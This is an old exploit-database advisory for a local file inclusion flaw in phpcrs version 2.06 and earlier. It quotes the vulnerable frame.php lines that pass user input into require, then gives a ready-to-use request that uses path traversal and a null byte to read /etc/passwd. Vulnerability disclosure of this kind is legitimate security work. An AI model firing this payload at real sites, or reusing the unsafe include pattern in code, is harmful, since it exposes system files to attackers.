@@ -1,0 +1,33 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+phpcrs <= 2.06 / Local File Inclusion Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+$ Program: phpcrs
+$ Version: <= 2.06
+$ File affected: frame.php
+$ Download: http://sourceforge.net/projects/phpcrs/
+
+
+Found by Pepelux <pepelux[at]enye-sec.org>
+eNYe-Sec - www.enye-sec.org
+
+
+--Bug --
+
+151.	elseif( isset( $btnStartImport  ) ) {
+152.   		require("../inc/frmDoImport.inc.php");
+153. 		require("../inc/". $importFunction .".inc.php");
+154.		require("../inc/inc/getFunctions.inc.php");
+155.		$importFunction();
+156.		frmDoImport( $selectedImport );
+157.	}
+
+
+-- Exploit --
+
+http://site.com/frame.php?btnStartImport=xxx&importFunction=../../../../../etc/passwd%00
+
+NOTE: website only works with Firefox. To navigate you must use Firefox and to exploit 
+it, you only have to change the user-agent.
+
+# milw0rm.com [2008-10-22]
